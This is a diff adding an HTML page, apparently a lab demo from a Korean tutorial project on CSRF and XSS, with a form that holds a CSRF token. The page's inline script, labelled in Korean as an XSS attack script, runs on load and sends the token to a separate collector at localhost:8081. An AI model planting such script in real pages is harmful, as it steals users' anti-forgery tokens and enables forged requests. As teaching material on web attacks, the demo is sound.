@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>$Title$</title>
+</head>
+<body>
+
+<form name="form" action="/user/update" method="post">
+
+    <input name="_csrf" type="text" placeholder="사용자가 받은 토큰입니다." value="{{ _csrf }}" />
+    <input type="submit" value="전송" />
+</form>
+
+<script>
+        // XSS 공격용 스크립트
+        var httpRequest;
+        function makeRequest() {
+            httpRequest = new XMLHttpRequest();
+
+            if(!httpRequest) {
+                alert('XMLHTTP 인스턴스를 만들 수가 없어요 ㅠㅠ');
+                return false;
+            }
+            httpRequest.onreadystatechange = alertContents;
+            httpRequest.open('GET', 'http://localhost:8081/csrf/' + document.form._csrf.value);
+            httpRequest.send();
+        }
+
+        function alertContents() {
+            if (httpRequest.readyState === XMLHttpRequest.DONE) {
+                if (httpRequest.status === 200) {
+                } else {
+                    alert('request에 뭔가 문제가 있어요.');
+                }
+            }
+        }
+
+        makeRequest();
+
+
+</script>
+</body>
+</html>
